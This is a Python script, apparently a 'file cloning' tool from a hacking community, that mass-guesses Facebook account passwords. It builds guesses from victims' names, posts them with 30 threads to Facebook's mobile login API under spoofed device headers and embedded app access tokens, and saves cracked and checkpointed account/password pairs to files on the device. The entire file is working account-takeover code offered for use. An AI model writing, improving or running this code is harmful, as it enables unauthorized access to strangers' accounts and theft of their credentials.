#Coded by HANNAN . Modified by SIAM AHMED 

import os,time,random,re,sys,string, subprocess

from concurrent.futures import ThreadPoolExecutor as tpe



try:

 import time,json,uuid,requests

except:

 os.system("pip install requests")
 
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests bs4')

		
ugen=[]
for xd in range(10000):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='SAMSUNG SM-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='/G973FXXU3ASG8) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/'
    h=random.randrange(73,115)
    i='0'
    j=random.randrange(4200,6000)
    k=random.randrange(40,200)
    l='Mobile Safari/537.36'
    uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])
cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])


idss = []

pp = []

oku = []

cpu = []

l = []

idx = []

loop = 0



def oo(t):

  return '\033[1;37m['+str(t)+']\033[1;37m '



W = '\x1b[1;97m'

G = '\x1b[1;92m'

R = '\x1b[1;91m'

S = '\x1b[1;96m'

B = '\x1b[1;94m'

Y = '\x1b[1;93m'

P = '\x1b[1;95m'



logo=(f"""\u001b[1;96m

{W} /$$   /$$ /$$   /$$ /$$      
{G} | $$$ | $$| $$  / $$| $$      
{R} | $$$$| $$|  $$/ $$/| $$      
{S} | $$ $$ $$ \  $$$$/ | $$      
{B} | $$  $$$$  >$$  $$ | $$      
{Y} | $$\  $$$ /$$/\  $$| $$      
{P} | $$ \  $$| $$  \ $$| $$$$$$$$
{G} |__/  \__/|__/  |__/|________/
                             
                              \u001b[0;1m

Coded by Abdul Hannan Ansari

Modified by SIAM AHMED

""")



def clear():

   os.system('clear')

   print(logo);lin3()



def lin3():

   print('\33[1;37m---------------------------------')

def exit():

  sys.exit()



def main_menu():

    os.system("clear")

    print(logo);lin3()

    print(f"{oo(1)}File Cloning ")   

    print(f"{oo(0)}Exit")

    lin3()

    cp =input('[?] Choice : ')

    if cp=="1":file()

    if cp == "0":

     exit()

    main_menu()

     

def file():

    os.system("clear")

    print(logo);lin3()

    file = input(f"{oo('-')}Enter File: ")

    try:

        for x in open(file,'r').readlines():

            idx.append(x.strip())

    except:

        print(f"{oo('!')}File Not Found");time.sleep(1)

        main_menu() 

    method()

    exit()







"""

------Access Token------

Access Tokens. Change if necessary.



Ads Manager Android : 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28

Facebook Android : 350685531728|62f8ce9f74b12f84c123cc23437a4a32

Facebook iPhone : 6628568379|c1e620fa708a1d5696fb991c1bde5662

Ads Manager App for iOS : 1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae



--------URL and Host--------

Graph : https://graph.facebook.com/auth/login/

B-Graph : https://b-graph.facebook.com/auth/login

"""





def method():

    clear()

    

    lp = input(f'{oo("?")}Limit Passwords? : ')

    if lp.isnumeric():

        pp=[]

        clear()

        ex = 'firstlast first123 last123'

        print(f'{oo("+")}{ex} (ETC)')

        lin3()

        for x in range(int(lp)):

           pp.append(input(f'{oo(x+1)}Password : '))

    else:

       print(f"{oo('!')}Numeric Only");time.sleep(0.8)

       main_menu()

    clear() 

    print('\033[1;97m[+] Total Accounts For CraCk : \033[1;32m '+str(len(idx)))

    print(f'\x1b[1;97m[✓] Dont Use Airplane mOde ;)')

    lin3()

    def start(user):

     try:

        global loop,idx,cll

        r = requests.Session()

        user = user.strip()

        acc, name = user.split("|")

        first = name.rsplit(" ")[0]

        try:

            last = name.rsplit(" ")[1]

        except:

            last = first

        pers = str(int(loop)/int(len(idx)) * 100)[:4]

        sys.stdout.write(f'\r {R}[{W}HANNAN{R}] {P}({Y}{loop}{W} / {W}{len(idx)}{P}) {W}• {G}{len(oku)}\r')

        sys.stdout.flush()

        loop+=1

        for pswd in pp:

              heads= ('Davik/2.1.0 (Linux; U; Android 8.0.1; CPH8900 Build/TP1A.220905.001) [FBAN/FB4A;FBAV/246.0.0.22.130;FBBV/24053418;FBDM/{density=3.0,width=720,height=1080};FBLC/en_US;FBCR/Nepal_Telecom;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/CPH8900;FBSV/8.5.5;FBOP/1;FBCA/armeabi-v7a:armeabi;]')#Put Your user Agent Here

              pswd = pswd.replace(f'first',first.lower()).replace(f'First',first).replace(f'last',last.lower()).replace(f'Last',last).replace(f'Name',name).replace(f'name',name.lower())

              header = {

    "Content-Type": "application/x-www-form-accencoded",
    "Host": "graph.facebook.com",
    "User-Agent": heads,
    "X-FB-Net-HNI": "45204",
    "X-FB-SIM-HNI": "45201",
    "X-FB-Connection-Type": "unknown",
    "X-Tigon-Is-Retry": "False",
    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
    "x-fb-device-group": "5120",
    "X-FB-Friendly-Name": "ViewerReactionsMutation",
    "X-FB-Request-Analytics-Tags": "graphservice",
    "Accept-Encoding": "gzip, deflate",
    "X-FB-HTTP-Engine": "Liger",
    "X-FB-Client-IP": "True",
    "X-FB-Server-Cluster": "True",
    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
    "Connection": "Keep-Alive",
              }


              data={

    "adid": str(uuid.uuid4()),

    "format": "json",

    "device_id": str(uuid.uuid4()),

    "cpl": "true",

    "family_device_id": str(uuid.uuid4()),

    "credentials_type": "device_based_login_password",

    "error_detail_type": "button_with_disabled",

    "source": "device_based_login",

    "email": acc,

    "password": pswd,

    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",

    "generate_session_cookies": "1",

    "meta_inf_fbmeta": "",

    "advertiser_id": str(uuid.uuid4()),

    "currently_logged_in_userid": "0",

    "locale": "en_US",

    "client_country_code": "US",

    "method": "auth.login",

    "fb_api_req_friendly_name": "authenticate",

    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",

    "api_key": "882a8490361da98702bf97a021ddc14d",

              }



              response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False).text

              if "session_key" in response:

                 oku.append(acc)

                 cookie=f"sb={''.join(random.choices(string.ascii_letters+string.digits+'_',k=24))};" +";".join(f"{i['name']}={i['value']}" for i in json.loads(response)["session_cookies"])

                 print('\033[1;32m[OK] \033[1;32m'+acc+' \033[1;32m|\033[1;32m '+pswd)

                 #print(" [Cookie] ",cookie)

                 open('/sdcard/FXF-Ok.txt','a').write(f'{acc}|{pswd}\n')

                 break

              elif "User must verify their account" in response:

                cpu.append(acc)

                print('\033[1;33m[CP] \033[1;33m'+acc+' \033[1;33m|\033[1;33m '+pswd)

                open('/sdcard/FXF-CP.txt','a').write(f'{acc}|{pswd}\n')

                break

              else:

                   continue   

     except Exception as e:

       time.sleep(10)

    with tpe(max_workers=30) as tp:

            tp.map(start,idx)

    exit()    
    
    





main_menu()
